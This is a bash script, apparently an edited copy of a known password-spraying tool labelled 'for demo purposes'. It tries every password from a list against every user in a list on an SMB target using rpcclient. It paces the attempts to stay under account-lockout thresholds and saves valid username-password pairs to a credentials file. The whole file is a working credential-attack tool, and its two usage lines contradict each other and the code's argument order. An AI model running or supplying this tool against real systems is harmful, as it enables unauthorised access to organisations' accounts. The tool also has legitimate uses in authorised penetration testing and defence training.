#!/bin/bash

echo -e "\nSpray 2.1 the Password Sprayer by Jacob Wilkin(Greenwolf)\n"
echo -e "\Edited by Lee Berg for demo purposes!!!\n"

if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help" ] ; then
    echo "This script will password spray a target over a period of time"
    echo "It requires password policy as input so accounts are not locked out"
    echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>"
    echo -e "Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION\n"
    echo ""
    exit 0
fi

if [ $# -lt 5 ] ; then
    echo "Not Enough Arguments"
    echo "Useage: spray.sh <targetIP> <usernameList> <passwordList> <LockoutThreshold> <LockoutResetTimerInMinutes>"
    echo -e "Example: spray.sh 192.168.0.1 users.txt passwords.txt 4 30 1\n"
    exit 0
fi


#Internal Network SMB Spraying Code
if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
    mkdir -p logs
    set +H
    timebetweenusers=$8
    domain=$7
    target=$2
    cp $3 logs/username-removed-successes.txt
    userslist="logs/username-removed-successes.txt"
    passwordlist=$4
    lockout=$5
    lockoutduration=$(($6 * 60))
    counter=0
    touch logs/spray-logs.txt
            
    #start on list
    for password in $(cat $passwordlist); do
        time=$(date +%H:%M:%S)
    	for u in $(cat $userslist); do 
            (echo "$time : Spraying user: $u with password: $password")
            (echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt
            sleep $timebetweenusers
    	done
        cat logs/spray-logs.txt | grep -v "Cannot"
        cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
        cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | sort -u > logs/credentials.txt
        for user in $(cat logs/usernamestoremove.txt); do 
            sed -i.bak "/$user/d" $userslist
        done
        rm logs/usernamestoremove.txt
    	counter=$(($counter + 1))
    	if [ $counter -eq $lockout ] ; then
    		counter=0
    		sleep $lockoutduration
    	fi
    done
    exit 0
fi
